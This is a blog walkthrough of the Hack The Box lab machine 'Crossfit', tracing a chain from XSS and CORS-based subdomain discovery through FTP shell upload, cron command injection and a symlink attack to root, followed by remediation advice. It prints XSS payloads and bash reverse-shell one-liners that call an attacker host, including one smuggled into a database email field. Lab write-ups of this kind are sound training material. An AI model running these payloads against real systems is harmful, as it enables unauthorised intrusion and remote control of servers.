<!doctype html><html lang=en><head><title>Crossfit HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Crossfit HTB machine featuring XSS exploitation, CORS bypass for subdomain enumeration, FTP shell uploads, command injection via vulnerable libraries, and privilege escalation through predictable binary exploitation"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/crossfit-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Crossfit HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Crossfit HTB machine featuring XSS exploitation, CORS bypass for subdomain enumeration, FTP shell uploads, command injection via vulnerable libraries, and privilege escalation through predictable binary exploitation"><meta property="og:url" content="https://malayamanas.github.io/posts/crossfit-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 07:15:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/crossfit-htb-walkthrough/>Crossfit HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/web/>web</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/xss/>xss</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/cors/>cors</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ftp/>ftp</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/command-injection/>command-injection</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/mysql/>mysql</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/binary-exploitation/>binary-exploitation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/symlink-attack/>symlink-attack</a>&nbsp;</span><div class=post-content><div><h1 id=crossfit-htb---insane-linux-box-walkthrough>Crossfit HTB - Insane Linux Box Walkthrough<a href=#crossfit-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/Z3Lj_YN0crc?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=key-exploitation-steps-and-techniques-chronological-order>Key Exploitation Steps and Techniques (Chronological Order)<a href=#key-exploitation-steps-and-techniques-chronological-order class=hanchor arialabel=Anchor>#</a></h2><p>Based on the transcript, the following outlines the main exploitation steps and techniques used to compromise the &ldquo;Crossfit&rdquo; machine on Hack The Box. I&rsquo;ve focused on the core technical actions, omitting unrelated details like note-taking with Obsidian or tool installations (e.g., Flameshot). Steps are presented in the sequence they occurred in the walkthrough.</p><ol><li><p><strong>Initial Reconnaissance (Nmap Scan)</strong></p><ul><li>Performed a standard Nmap scan (<code>sudo nmap -sC -sV -oA nmap/crossfit [TARGET-IP]</code>) to identify open ports: 21 (FTP with SSL), 22 (SSH on Debian), and 80 (HTTP with Apache default page).</li><li>Grabbed SSL banner from FTP using OpenSSL (<code>openssl s_client -connect [TARGET-IP]:21 -starttls ftp</code>), revealing subdomains: stir.crossfit.htb and gymclub.crossfit.htb.</li><li>Added subdomains to <code>/etc/hosts</code> for virtual host resolution.</li></ul></li><li><p><strong>Virtual Host Enumeration</strong></p><ul><li>Accessed gymclub.crossfit.htb, which loaded a custom website (Apache default on main IP).</li><li>Ran Gobuster for virtual hosts (<code>gobuster vhost -u http://crossfit.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -v -o gobuster/vhost.out</code>), but no new hosts found initially.</li><li>Enumerated website for user inputs (contact forms on index.php, blog-single.php, contact.php) and potential usernames/emails from pages (e.g., Becky Taylor, Noah, Evelyn Fields, Leroy Guzman; emails like <a href=mailto:info@crossfit.htb>info@crossfit.htb</a>).</li></ul></li><li><p><strong>XSS Discovery and Initial Exploitation</strong></p><ul><li>Tested contact forms for XSS by injecting payloads (e.g., <code>&lt;script src="http://[ATTACKER-IP]/contact.php">&lt;/script></code>) in fields like name, email, comment.</li><li>Forms detected XSS and generated security reports, but the report viewer page reflected the User-Agent header without sanitization.</li><li>Used Burp Suite Repeater to inject XSS in User-Agent (e.g., <code>&lt;script src="http://[ATTACKER-IP]/useragent.php">&lt;/script></code>), confirming execution via callback to attacker&rsquo;s HTTP server.</li><li>Chained XSS to load external JavaScript (e.g., document.location for cookie theft, but no cookies found).</li></ul></li><li><p><strong>Subdomain Brute Force via CORS (Origin Header)</strong></p><ul><li>Noticed CORS headers (Access-Control-Allow-Origin) validated subdomains on HTTP responses.</li><li>Switched to ffuf for brute force (<code>ffuf -u http://[TARGET-IP] -H "Origin: http://FUZZ.crossfit.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mr "Access-Control-Allow-Origin" --ignore-body</code>), identifying ftp.crossfit.htb.</li><li>Added to <code>/etc/hosts</code>; page showed Apache default but confirmed via Origin header reflection.</li></ul></li><li><p><strong>Internal Page Fetch via XSS (Proxying Requests)</strong></p><ul><li>Used XSS to proxy requests via victim&rsquo;s browser with XMLHttpRequest in chained JS (e.g., fetch ftp.crossfit.htb, base64-encode response, send back to attacker).</li><li>Retrieved /accounts/create page, revealing username/password form with CSRF token.</li><li>Extended JS to parse CSRF token, POST to create account (username: ipsec, password: pleasesubscribe), bypassing CSRF.</li></ul></li><li><p><strong>FTP Access and Shell Upload (www-data)</strong></p><ul><li>Logged into FTP as created user (ipsec:pleasesubscribe) using lftp with SSL options.</li><li>Explored directories: /html (web root), /gymclub, /ftp (Laravel artifacts including .env with DB creds), /development-test (writable).</li><li>Uploaded PHP reverse shell (ip.php: <code>&lt;?php system('bash -c "bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&amp;1"'); ?></code>) to /development-test.</li><li>Added development-test.crossfit.htb to /etc/hosts; triggered shell via browser, gaining www-data access.</li></ul></li><li><p><strong>Privilege Escalation to hank</strong></p><ul><li>As www-data, ran LinPEAS for enumeration, finding hashes in files (e.g., SHA-512 for hank, bcrypt &ldquo;password&rdquo;).</li><li>Cracked hank&rsquo;s hash (powerpuffgirls) using Hashcat (<code>hashcat -m 1800 hashes/crossfit_sha512 /opt/wordlists/rockyou.txt</code>).</li><li>SSH&rsquo;d as hank (hank@[TARGET-IP]:powerpuffgirls).</li></ul></li><li><p><strong>Command Injection via Cronjob (to isaac)</strong></p><ul><li>As hank (member of admins group), inspected /send_updates.php cronjob (run by isaac every minute).</li><li>Script used vulnerable MyCartl Shell Command library (escapeArgs=true but ineffective; GitHub issue confirmed RCE).</li><li>Found FTP admin creds in configs (/etc/vsftpd.conf, pam.d/vsftpd).</li><li>Logged into FTP as ftp_adm, created file in /messages to trigger loop.</li><li>Connected to MySQL (crossfit DB creds from .env), inserted malicious email into users table (<code>INSERT INTO users (email) VALUES ('; bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&amp;1;');</code>).</li><li>Triggered cronjob, gaining isaac shell.</li></ul></li><li><p><strong>Privilege Escalation to root (Binary Exploitation)</strong></p><ul><li>As isaac (staff group), enumerated with LinPEAS/PSpy/find; found root-run binary /usr/bin/db_message (SUID? No, but cron&rsquo;d).</li><li>Copied binary, reversed in Ghidra: Connects to MySQL (hardcoded creds), queries messages table, generates predictable filename in /var/local (time-seeded srand + MD5 of rand + message ID).</li><li>Wrote C program to predict rand (seed = time(NULL) - (time(NULL) % 60) + 61).</li><li>Inserted SSH pubkey into messages table columns (split across name/email/message to avoid spaces).</li><li>Predicted filename, symlinked /var/local/&lt;predicted_md5> to /root/.ssh/authorized_keys (writable by staff).</li><li>Binary wrote key to symlink; SSH&rsquo;d as root using corresponding private key.</li></ul></li></ol><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><h3 id=httpweb-server-apache>HTTP/Web Server (Apache)<a href=#httpweb-server-apache class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>XSS in Contact Forms</strong>: Forms detect basic XSS but fail to sanitize reflected inputs in security reports.
<em>Source Code Fix</em>: Implement proper input sanitization (e.g., using HTML entities or libraries like DOMPurify) on all user-submitted fields, including name, email, and comments, before rendering in reports.
<em>Configuration Fix</em>: Enable Content Security Policy (CSP) headers to restrict script sources.</li><li><strong>XSS via User-Agent in Security Reports</strong>: User-Agent header is reflected unsanitized in admin-viewed reports.
<em>Source Code Fix</em>: Sanitize or escape the User-Agent string before displaying it (e.g., via htmlspecialchars in PHP).
<em>Configuration Fix</em>: Use web application firewall (WAF) rules in Apache (e.g., mod_security) to filter malicious headers.</li><li><strong>CORS Misconfiguration Allowing Subdomain Brute Force</strong>: Origin header reflection enables enumeration of valid subdomains.
<em>Source Code Fix</em>: Validate and restrict allowed origins in application logic before echoing in Access-Control-Allow-Origin.
<em>Configuration Fix</em>: Set strict CORS policies in Apache config (e.g., <code>Header set Access-Control-Allow-Origin "https://gymclub.crossfit.htb"</code> only for trusted origins).</li><li><strong>Virtual Host Routing Exposure</strong>: Internal subdomains (e.g., ftp.crossfit.htb) accessible via proxied requests but not directly.
<em>Configuration Fix</em>: Configure Apache virtual hosts to require authentication or IP restrictions for internal domains.</li></ul><h3 id=ftp-server>FTP Server<a href=#ftp-server class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Weak Account Creation via Proxied Internal Interface</strong>: Accounts can be created via /accounts/create without proper access controls, exploitable via XSS proxying.
<em>Source Code Fix</em>: Add CAPTCHA, rate limiting, or multi-factor checks to the account creation form; validate CSRF tokens strictly.
<em>Configuration Fix</em>: Restrict FTP to specific IP ranges or require VPN access in vsftpd.conf.</li><li><strong>Writable Directories Allowing Shell Uploads</strong>: Directories like /development-test are writable, enabling PHP shell uploads.
<em>Source Code Fix</em>: N/A (not code-based).
<em>Configuration Fix</em>: Set stricter permissions in vsftpd.conf (e.g., <code>write_enable=NO</code> for non-essential users) and use chroot to jail users.</li><li><strong>SSL Banner Leakage</strong>: SSL certificate reveals internal subdomains and emails.
<em>Source Code Fix</em>: N/A.
<em>Configuration Fix</em>: Use self-signed or wildcard certificates without sensitive info; disable banner grabbing if possible.</li><li><strong>Anonymous Login Enabled but Incorrectly Configured</strong>: Allows attempts but fails; could lead to brute force if misconfigured.
<em>Source Code Fix</em>: N/A.
<em>Configuration Fix</em>: Explicitly disable anonymous access in vsftpd.conf (<code>anonymous_enable=NO</code>).</li></ul><h3 id=ssh-server>SSH Server<a href=#ssh-server class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Weak Password Hashing and Reuse</strong>: Hank&rsquo;s SHA-512 hash cracked easily from file; potential for password reuse.
<em>Source Code Fix</em>: N/A.
<em>Configuration Fix</em>: Enforce stronger password policies in /etc/pam.d/sshd (e.g., via pam_pwquality) and use key-based auth only (<code>PasswordAuthentication no</code> in sshd_config).</li><li><strong>Exposed User Enumeration</strong>: Users like hank, isaac visible via logs and groups.
<em>Source Code Fix</em>: N/A.
<em>Configuration Fix</em>: Disable password auth and limit login attempts with fail2ban.</li></ul><h3 id=mysql-database>MySQL Database<a href=#mysql-database class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Hardcoded Credentials</strong>: Credentials in .env and db_message binary.
<em>Source Code Fix</em>: Use environment variables or secret managers (e.g., via PHP&rsquo;s getenv) instead of hardcoding.
<em>Configuration Fix</em>: Rotate credentials regularly and restrict access in my.cnf (e.g., bind-address=127.0.0.1).</li><li><strong>Unrestricted Insert Access</strong>: Allows command injection or arbitrary data via users/messages tables.
<em>Source Code Fix</em>: Use prepared statements with parameterized queries in PHP to prevent injection.
<em>Configuration Fix</em>: Grant minimal privileges to application users (e.g., no INSERT on sensitive tables).</li><li><strong>Exposed Database via FTP</strong>: .env file with creds accessible in FTP directories.
<em>Source Code Fix</em>: N/A.
<em>Configuration Fix</em>: Exclude sensitive files from FTP access via vsftpd userlist or chroot.</li></ul><h3 id=cronjobs-and-php-scripts>Cronjobs and PHP Scripts<a href=#cronjobs-and-php-scripts class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Command Injection in send_updates.php</strong>: Vulnerable MyCartl Shell Command library allows RCE despite escapeArgs=true.
<em>Source Code Fix</em>: Update the library to a patched version or replace with secure exec functions (e.g., escapeshellarg + proc_open).
<em>Configuration Fix</em>: Run cron as low-privilege user; add input validation filters.</li><li><strong>Insecure File Processing Loop</strong>: Processes files from /messages without validation, triggering injection.
<em>Source Code Fix</em>: Sanitize database-fetched data (e.g., email) before passing to shell commands.
<em>Configuration Fix</em>: Restrict directory permissions to prevent unauthorized file creation.</li><li><strong>Outdated/Vulnerable Library Usage</strong>: MyCartl library has known RCE issues.
<em>Source Code Fix</em>: Audit and update dependencies (e.g., via Composer).
<em>Configuration Fix</em>: N/A.</li></ul><h3 id=custom-binary-db_message>Custom Binary (db_message)<a href=#custom-binary-db_message class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Time-Seeded Random Number Generation</strong>: Predictable rand() leads to filename collisions.
<em>Source Code Fix</em>: Use cryptographically secure random (e.g., random_bytes or /dev/urandom instead of srand(time(NULL))).
<em>Configuration Fix</em>: N/A.</li><li><strong>Insecure File Writing to Predictable Path</strong>: Writes to /var/local with group-writable perms, enabling symlink attacks.
<em>Source Code Fix</em>: Use mkstemp for temporary files or absolute paths; drop privileges after root checks.
<em>Configuration Fix</em>: Change /var/local permissions to root-only (chmod 700); run binary without root if possible.</li><li><strong>Hardcoded Database Credentials</strong>: Embedded in binary.
<em>Source Code Fix</em>: Load creds from config files or env vars.
<em>Configuration Fix</em>: Use separate config file with restricted perms.</li><li><strong>Lack of Input Validation on Database Rows</strong>: Processes messages table without sanitization.
<em>Source Code Fix</em>: Validate and escape row data before processing.
<em>Configuration Fix</em>: N/A.</li></ul><h3 id=system-wide-configurations>System-Wide Configurations<a href=#system-wide-configurations class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Process Hiding (hidepid=2)</strong>: Hides PIDs but doesn&rsquo;t prevent enumeration via other means (e.g., PSpy).
<em>Source Code Fix</em>: N/A.
<em>Configuration Fix</em>: Strengthen with AppArmor/SELinux profiles to restrict process spying.</li><li><strong>Overly Permissive Groups (admins, staff)</strong>: Allows access to sensitive dirs/scripts.
<em>Source Code Fix</em>: N/A.
<em>Configuration Fix</em>: Audit /etc/group; remove unnecessary users and use sudoers for targeted access.</li><li><strong>SUID/Privilege Issues</strong>: Binary runs as root unnecessarily.
<em>Source Code Fix</em>: Implement privilege dropping (e.g., setuid after init).
<em>Configuration Fix</em>: Remove SUID bit if not needed; use capabilities instead.</li></ul><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Crossfit is an excellent machine that demonstrates the complexity of modern web application security and the interconnected nature of system vulnerabilities. It requires expertise in:</p><ul><li>Advanced web application security and XSS exploitation</li><li>CORS misconfiguration abuse and subdomain enumeration</li><li>FTP service exploitation and file upload vulnerabilities</li><li>Command injection through vulnerable third-party libraries</li><li>Binary reverse engineering and predictable random number exploitation</li><li>Symlink attacks and privilege escalation techniques</li></ul><p>The machine emphasizes the importance of proper input validation, secure coding practices, regular dependency updates, and the principle of least privilege in system administration.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>